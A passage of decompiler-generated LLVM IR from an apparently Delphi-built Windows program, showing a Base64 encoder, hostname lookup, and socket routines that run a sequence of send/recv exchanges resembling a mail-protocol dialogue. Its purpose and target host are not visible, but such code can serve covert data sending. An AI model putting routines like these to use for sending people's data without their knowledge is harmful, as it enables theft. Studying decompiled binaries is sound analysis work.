  %79 = or i64 %78, %76, !insn.addr !769
  %80 = sdiv i64 %79, 3, !insn.addr !769
  %81 = trunc i64 %80 to i32, !insn.addr !769
  store i32 %81, i32* %eax, align 4, !insn.addr !769
  %82 = srem i64 %79, 3, !insn.addr !769
  %83 = trunc i64 %82 to i32, !insn.addr !769
  %84 = icmp eq i32 %83, 0, !insn.addr !770
  %85 = icmp eq i1 %84, false, !insn.addr !771
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !771

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !772
  %87 = ashr i32 %86, 31, !insn.addr !773
  %88 = zext i32 %86 to i64, !insn.addr !774
  %89 = zext i32 %87 to i64, !insn.addr !774
  %90 = mul i64 %89, 4294967296, !insn.addr !774
  %91 = or i64 %90, %88, !insn.addr !774
  %92 = sdiv i64 %91, 3, !insn.addr !774
  %93 = trunc i64 %92 to i32, !insn.addr !774
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !775
  br label %dec_label_pc_405430, !insn.addr !775

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !775

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !776
  ret i32 %94, !insn.addr !776

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !777
  %96 = zext i32 %95 to i64, !insn.addr !777
  %97 = zext i32 %arg3 to i64, !insn.addr !777
  %98 = mul i64 %97, 4294967296, !insn.addr !777
  %99 = or i64 %98, %96, !insn.addr !777
  %100 = zext i32 %arg2 to i64, !insn.addr !777
  %101 = sdiv i64 %99, %100, !insn.addr !777
  %102 = trunc i64 %101 to i32, !insn.addr !777
  %103 = add i32 %102, 1, !insn.addr !778
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !778
  br label %dec_label_pc_405430, !insn.addr !778

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !779
  ret i32 %104, !insn.addr !780

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !781
  %106 = load i32, i32* %105, align 4, !insn.addr !781
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !781
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !782
  %109 = load i32, i32* %108, align 4, !insn.addr !782
  %110 = add i32 %109, %107, !insn.addr !782
  store i32 %110, i32* %108, align 4, !insn.addr !782
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !783
  %113 = inttoptr i32 %112 to i8*, !insn.addr !783
  %114 = load i8, i8* %113, align 1, !insn.addr !783
  %115 = trunc i32 %111 to i8, !insn.addr !783
  %116 = add i8 %114, %115, !insn.addr !783
  store i8 %116, i8* %113, align 1, !insn.addr !783
  %117 = load i32, i32* %eax, align 4, !insn.addr !784
  ret i32 %117, !insn.addr !784
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !785
  %esp.0.reg2mem = alloca i32, !insn.addr !785
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !786
  %3 = inttoptr i32 %2 to i32*, !insn.addr !786
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !787
  %13 = inttoptr i32 %12 to i32*, !insn.addr !787
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !785
  br label %dec_label_pc_40543e, !insn.addr !785

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !788
  %25 = add i32 %24, 3, !insn.addr !789
  %26 = load i32, i32* %3, align 4, !insn.addr !786
  %27 = icmp sgt i32 %25, %26, !insn.addr !790
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !790

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !791
  %29 = inttoptr i32 %28 to i8*, !insn.addr !791
  %30 = load i8, i8* %29, align 1, !insn.addr !791
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !792
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !793
  %34 = inttoptr i32 %33 to i8*, !insn.addr !793
  %35 = load i8, i8* %34, align 1, !insn.addr !793
  store i8 %35, i8* %5, align 1, !insn.addr !794
  %36 = load i8, i8* %29, align 1, !insn.addr !795
  %37 = mul i8 %36, 16, !insn.addr !796
  %38 = and i8 %37, 48, !insn.addr !797
  %39 = add i32 %28, 1, !insn.addr !798
  %40 = inttoptr i32 %39 to i8*, !insn.addr !798
  %41 = load i8, i8* %40, align 1, !insn.addr !798
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !799
  %44 = zext i8 %43 to i32, !insn.addr !799
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !800
  %46 = inttoptr i32 %45 to i8*, !insn.addr !800
  %47 = load i8, i8* %46, align 1, !insn.addr !800
  store i8 %47, i8* %7, align 1, !insn.addr !801
  %48 = load i8, i8* %40, align 1, !insn.addr !802
  %49 = mul i8 %48, 4, !insn.addr !803
  %50 = and i8 %49, 60, !insn.addr !804
  %51 = add i32 %28, 2, !insn.addr !805
  %52 = inttoptr i32 %51 to i8*, !insn.addr !805
  %53 = load i8, i8* %52, align 1, !insn.addr !805
  %54 = udiv i8 %53, 64, !insn.addr !806
  %55 = or i8 %54, %50, !insn.addr !807
  %56 = zext i8 %55 to i32, !insn.addr !807
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !808
  %58 = inttoptr i32 %57 to i8*, !insn.addr !808
  %59 = load i8, i8* %58, align 1, !insn.addr !808
  store i8 %59, i8* %9, align 1, !insn.addr !809
  %60 = and i8 %53, 63, !insn.addr !810
  %61 = zext i8 %60 to i32, !insn.addr !810
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !811
  %63 = inttoptr i32 %62 to i8*, !insn.addr !811
  %64 = load i8, i8* %63, align 1, !insn.addr !811
  store i8 %64, i8* %11, align 1, !insn.addr !812
  br label %dec_label_pc_405589, !insn.addr !813

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !814
  %66 = icmp sgt i32 %65, %26, !insn.addr !815
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !815

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !816
  %77 = and i8 %76, 48, !insn.addr !817
  %78 = add i32 %67, 1, !insn.addr !818
  %79 = inttoptr i32 %78 to i8*, !insn.addr !818
  %80 = load i8, i8* %79, align 1, !insn.addr !818
  %81 = zext i8 %80 to i32, !insn.addr !818
  %82 = udiv i8 %80, 16, !insn.addr !819
  %83 = or i8 %82, %77, !insn.addr !820
  %84 = zext i8 %83 to i32, !insn.addr !820
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !821
  %86 = inttoptr i32 %85 to i8*, !insn.addr !821
  %87 = load i8, i8* %86, align 1, !insn.addr !821
  store i8 %87, i8* %7, align 1, !insn.addr !822
  %88 = mul i32 %81, 4, !insn.addr !823
  %89 = and i32 %88, 60, !insn.addr !824
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !825
  %91 = inttoptr i32 %90 to i8*, !insn.addr !825
  %92 = load i8, i8* %91, align 4, !insn.addr !825
  store i8 %92, i8* %9, align 1, !insn.addr !826
  store i8 61, i8* %11, align 1, !insn.addr !827
  br label %dec_label_pc_405589, !insn.addr !828

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !829
  %94 = mul i32 %93, 16, !insn.addr !830
  %95 = and i32 %94, 48, !insn.addr !831
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !832
  %97 = inttoptr i32 %96 to i8*, !insn.addr !832
  %98 = load i8, i8* %97, align 16, !insn.addr !832
  store i8 %98, i8* %7, align 1, !insn.addr !833
  store i8 61, i8* %9, align 1, !insn.addr !834
  store i8 61, i8* %11, align 1, !insn.addr !835
  br label %dec_label_pc_405589, !insn.addr !835

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !787
  %100 = inttoptr i32 %99 to i32*, !insn.addr !836
  %101 = load i32, i32* %100, align 4, !insn.addr !836
  %102 = add i32 %esp.0.reload, -4, !insn.addr !836
  %103 = inttoptr i32 %102 to i32*, !insn.addr !836
  store i32 %101, i32* %103, align 4, !insn.addr !836
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !837
  %105 = load i32, i32* %15, align 4, !insn.addr !838
  %106 = add i32 %esp.0.reload, -8, !insn.addr !838
  %107 = inttoptr i32 %106 to i32*, !insn.addr !838
  store i32 %105, i32* %107, align 4, !insn.addr !838
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !839
  %109 = load i32, i32* %17, align 4, !insn.addr !840
  %110 = add i32 %esp.0.reload, -12, !insn.addr !840
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !840
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !841
  %113 = load i32, i32* %19, align 4, !insn.addr !842
  %114 = add i32 %esp.0.reload, -16, !insn.addr !842
  %115 = inttoptr i32 %114 to i32*, !insn.addr !842
  store i32 %113, i32* %115, align 4, !insn.addr !842
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !843
  %117 = load i32, i32* %21, align 4, !insn.addr !844
  %118 = add i32 %esp.0.reload, -20, !insn.addr !844
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !844
  %120 = call i32 @"@LStrCatN"(), !insn.addr !845
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !846
  %122 = load i32, i32* %23, align 4, !insn.addr !847
  %123 = add i32 %122, -1, !insn.addr !847
  %124 = icmp eq i32 %123, 0, !insn.addr !847
  store i32 %123, i32* %23, align 4, !insn.addr !847
  %125 = icmp eq i1 %124, false, !insn.addr !848
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !848
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !848
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !848

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !849
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !850
  store i32 4216319, i32* %111, align 4, !insn.addr !851
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !852
  ret i32 %127, !insn.addr !853
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !854
  ret i32 %0, !insn.addr !854
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !855
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !856
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !857
  %0 = call i32 @function_4036c8(), !insn.addr !858
  %1 = inttoptr i32 %0 to i8*, !insn.addr !859
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !860
  %3 = call i32 @"@FillChar"(), !insn.addr !861
  %4 = icmp eq %hostent* %2, null, !insn.addr !862
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !863

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !860
  %6 = add i32 %5, 12, !insn.addr !864
  %7 = inttoptr i32 %6 to i32*, !insn.addr !864
  %8 = load i32, i32* %7, align 4, !insn.addr !864
  %9 = inttoptr i32 %8 to i32*, !insn.addr !865
  %10 = load i32, i32* %9, align 4, !insn.addr !865
  %11 = inttoptr i32 %10 to i8*, !insn.addr !866
  %12 = load i8, i8* %11, align 1, !insn.addr !866
  %13 = sext i8 %12 to i32, !insn.addr !867
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !868
  br label %dec_label_pc_405653, !insn.addr !868

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !869
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !870
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !871
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !872
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !872
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !872
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !873
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !874
  %5 = trunc i32 %4 to i16, !insn.addr !874
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !875
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !876
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !876
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !877
  %9 = icmp eq i32 %8, -1, !insn.addr !878
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !879
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !879

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !880
  %11 = trunc i32 %10 to i16, !insn.addr !881
  %12 = call i16 @htons(i16 %11), !insn.addr !881
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !882
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !882
  %14 = sext i16 %12 to i32, !insn.addr !883
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !883
  %16 = icmp eq i32 %15, 0, !insn.addr !884
  %17 = icmp eq i1 %16, false, !insn.addr !885
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !885
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !885

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !886
  store i32 %8, i32* %18, align 4, !insn.addr !886
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !887
  br label %dec_label_pc_4056f2, !insn.addr !887

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !888
  %20 = load i32, i32* %19, align 4, !insn.addr !888
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !889
  %21 = add i32 %esp.0.reload, 8, !insn.addr !890
  %22 = inttoptr i32 %21 to i32*, !insn.addr !890
  store i32 4216591, i32* %22, align 4, !insn.addr !890
  %23 = call i32 @"@LStrClr"(), !insn.addr !891
  ret i32 %23, !insn.addr !892
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !893
  ret i32 %0, !insn.addr !893
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !894
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !895
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !896
  %2 = call i32 @WSACleanup(), !insn.addr !897
  ret i32 %2, !insn.addr !898
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !899
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !900
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !900
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !900
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !901
  %4 = call i32 @function_4036c8(), !insn.addr !902
  %5 = call i32 @StrCopy(), !insn.addr !903
  %6 = call i32 @function_406f48(i32 4), !insn.addr !904
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !905
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !906
  %9 = call i32 @"@LStrClr"(), !insn.addr !907
  ret i32 %9, !insn.addr !908
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !909
  ret i32 %0, !insn.addr !909
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !910
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !911
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !912
  %2 = call i32 @StrPas(), !insn.addr !913
  ret i32 %2, !insn.addr !914
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !915
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !915
  %esp.0.reg2mem = alloca i32, !insn.addr !915
  %ecx.0.reg2mem = alloca i32, !insn.addr !915
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !916
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !917
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !917
  br label %dec_label_pc_4057d9, !insn.addr !917

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !918
  %2 = inttoptr i32 %1 to i32*, !insn.addr !918
  store i32 0, i32* %2, align 4, !insn.addr !918
  %3 = add i32 %esp.0.reload, -8, !insn.addr !919
  %4 = inttoptr i32 %3 to i32*, !insn.addr !919
  store i32 0, i32* %4, align 4, !insn.addr !919
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !920
  %6 = icmp eq i32 %5, 0, !insn.addr !920
  %7 = icmp eq i1 %6, false, !insn.addr !921
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !921
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !921
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !921

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !922
  %9 = inttoptr i32 %8 to i32*, !insn.addr !922
  store i32 0, i32* %9, align 4, !insn.addr !922
  %10 = call i32 @function_4036b8(), !insn.addr !923
  %11 = call i32 @function_4036b8(), !insn.addr !924
  %12 = call i32 @function_4036b8(), !insn.addr !925
  %13 = call i32 @function_4036b8(), !insn.addr !926
  %14 = call i32 @function_4036b8(), !insn.addr !927
  %15 = call i32 @function_4036b8(), !insn.addr !928
  %16 = call i32 @function_4036b8(), !insn.addr !929
  %17 = add i32 %esp.0.reload, -20, !insn.addr !930
  %18 = inttoptr i32 %17 to i32*, !insn.addr !930
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !930
  store i32 %19, i32* %18, align 4, !insn.addr !930
  %20 = add i32 %esp.0.reload, -24, !insn.addr !931
  %21 = inttoptr i32 %20 to i32*, !insn.addr !931
  store i32 4217413, i32* %21, align 4, !insn.addr !931
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !932
  %23 = add i32 %esp.0.reload, -28, !insn.addr !932
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !932
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !933
  %25 = call i32 @function_405664(), !insn.addr !934
  %26 = icmp eq i32 %25, 0, !insn.addr !935
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !936
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !936
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !936

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !937
  %28 = inttoptr i32 %27 to i32*, !insn.addr !937
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !937
  %29 = add i32 %esp.0.reload, -36, !insn.addr !938
  %30 = inttoptr i32 %29 to i32*, !insn.addr !938
  %31 = add i32 %esp.0.reload, -40, !insn.addr !939
  %32 = inttoptr i32 %31 to i32*, !insn.addr !939
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !939
  %33 = call i32 @"@LStrCatN"(), !insn.addr !940
  %34 = call i32 @function_405724(), !insn.addr !941
  %35 = call i32 @function_4057a4(), !insn.addr !942
  %36 = call i32 @function_405724(), !insn.addr !943
  %37 = call i32 @function_4057a4(), !insn.addr !944
  %38 = call i32 @"@LStrCat"(), !insn.addr !945
  %39 = call i32 @function_405724(), !insn.addr !946
  %40 = call i32 @function_4057a4(), !insn.addr !947
  %41 = call i32 @"@LStrCat"(), !insn.addr !948
  %42 = call i32 @function_405724(), !insn.addr !949
  %43 = call i32 @function_4057a4(), !insn.addr !950
  %44 = add i32 %esp.0.reload, -44, !insn.addr !951
  %45 = inttoptr i32 %44 to i32*, !insn.addr !951
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !951
  %46 = add i32 %esp.0.reload, -48, !insn.addr !952
  %47 = inttoptr i32 %46 to i32*, !insn.addr !952
  store i32 %arg1, i32* %47, align 4, !insn.addr !952
  %48 = add i32 %esp.0.reload, -52, !insn.addr !953
  %49 = inttoptr i32 %48 to i32*, !insn.addr !953
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !953
  %50 = add i32 %esp.0.reload, -56, !insn.addr !954
  %51 = inttoptr i32 %50 to i32*, !insn.addr !954
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !954
  %52 = call i32 @"@LStrCatN"(), !insn.addr !955
  %53 = call i32 @function_405724(), !insn.addr !956
  %54 = call i32 @function_4057a4(), !insn.addr !957
  %55 = add i32 %esp.0.reload, -60, !insn.addr !958
  %56 = inttoptr i32 %55 to i32*, !insn.addr !958
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !958
  %57 = add i32 %esp.0.reload, -64, !insn.addr !959
  %58 = inttoptr i32 %57 to i32*, !insn.addr !959
  store i32 %arg2, i32* %58, align 4, !insn.addr !959
  %59 = add i32 %esp.0.reload, -68, !insn.addr !960
  %60 = inttoptr i32 %59 to i32*, !insn.addr !960
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !960
  %61 = add i32 %esp.0.reload, -72, !insn.addr !961
  %62 = inttoptr i32 %61 to i32*, !insn.addr !961
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !961
  %63 = call i32 @"@LStrCatN"(), !insn.addr !962
  %64 = call i32 @function_405724(), !insn.addr !963
  %65 = call i32 @function_4057a4(), !insn.addr !964
  %66 = call i32 @function_405724(), !insn.addr !965
  %67 = call i32 @function_4057a4(), !insn.addr !966
  %68 = add i32 %esp.0.reload, -76, !insn.addr !967
  %69 = inttoptr i32 %68 to i32*, !insn.addr !967
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !967
  %70 = add i32 %esp.0.reload, -80, !insn.addr !968
  %71 = inttoptr i32 %70 to i32*, !insn.addr !968
  store i32 %arg1, i32* %71, align 4, !insn.addr !968
  %72 = add i32 %esp.0.reload, -84, !insn.addr !969
  %73 = inttoptr i32 %72 to i32*, !insn.addr !969
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !969
  %74 = add i32 %esp.0.reload, -88, !insn.addr !970
  %75 = inttoptr i32 %74 to i32*, !insn.addr !970
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !970
  %76 = add i32 %esp.0.reload, -92, !insn.addr !971
  %77 = inttoptr i32 %76 to i32*, !insn.addr !971
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !971
  %78 = add i32 %esp.0.reload, -96, !insn.addr !972
  %79 = inttoptr i32 %78 to i32*, !insn.addr !972
  store i32 %arg2, i32* %79, align 4, !insn.addr !972
  %80 = add i32 %esp.0.reload, -100, !insn.addr !973
  %81 = inttoptr i32 %80 to i32*, !insn.addr !973
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !973
  %82 = add i32 %esp.0.reload, -104, !insn.addr !974
  %83 = inttoptr i32 %82 to i32*, !insn.addr !974
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !974
  %84 = add i32 %esp.0.reload, -108, !insn.addr !975
  %85 = inttoptr i32 %84 to i32*, !insn.addr !975
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !975
  %86 = add i32 %esp.0.reload, -112, !insn.addr !976
  %87 = inttoptr i32 %86 to i32*, !insn.addr !976
  store i32 %arg3, i32* %87, align 4, !insn.addr !976
  %88 = add i32 %esp.0.reload, -116, !insn.addr !977
  %89 = inttoptr i32 %88 to i32*, !insn.addr !977
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !977
  %90 = add i32 %esp.0.reload, -120, !insn.addr !978
  %91 = inttoptr i32 %90 to i32*, !insn.addr !978
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !978
  %92 = add i32 %esp.0.reload, -124, !insn.addr !979
  %93 = inttoptr i32 %92 to i32*, !insn.addr !979
  store i32 %arg4, i32* %93, align 4, !insn.addr !979
  %94 = add i32 %esp.0.reload, -128, !insn.addr !980
  %95 = inttoptr i32 %94 to i32*, !insn.addr !980
